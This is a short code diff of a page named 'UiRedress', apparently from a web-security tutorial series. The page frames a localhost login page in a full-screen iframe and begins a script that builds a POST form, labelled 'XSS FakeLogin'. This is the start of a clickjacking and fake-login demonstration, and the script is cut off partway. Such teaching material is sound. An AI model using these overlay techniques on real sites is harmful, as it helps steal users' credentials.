@@ -3,6 +3,10 @@
     Layout = null;
 }
 
+<!-- Tutorial 3-XSS Fakelogin-UI Redress -->
+<!-- Tutorial 4-UI Redress -->
+
+
 <!DOCTYPE html>
 
 <html>
@@ -13,12 +17,10 @@
     <title>UiRedress</title>
 </head>
 <body style="margin:0;">
-    <!--UI Redress-->
     <iframe id="loginSite" src="http://localhost:48515/Account/Login" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:0;"></iframe>
 
 
     <script>
-        //XSS FakeLogin
         var form = document.createElement("form");
         form.setAttribute("method", "POST");
         form.setAttribute("accept-charset", "utf-8");
